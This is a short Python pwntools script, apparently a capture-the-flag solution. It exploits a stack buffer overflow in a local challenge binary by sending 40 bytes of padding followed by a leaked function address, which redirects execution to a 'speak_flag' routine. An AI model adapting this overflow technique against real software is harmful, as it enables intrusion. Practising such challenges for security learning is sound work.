#!/usr/bin/env python3
from pwn import *
import re

binary = './chall'
p = process(binary)
# p = remote('localhost', 9090)

p.recvuntil(b"'speak_flag' is at: ")
speak_flag_addr = int(p.recvline().strip(), 16)
print(speak_flag_addr)

p.recvuntil(b"Input a new cry for Pet A > ")
payload = b'A' * (32 + 8)
payload += p64(speak_flag_addr)
p.sendline(payload)
p.interactive()
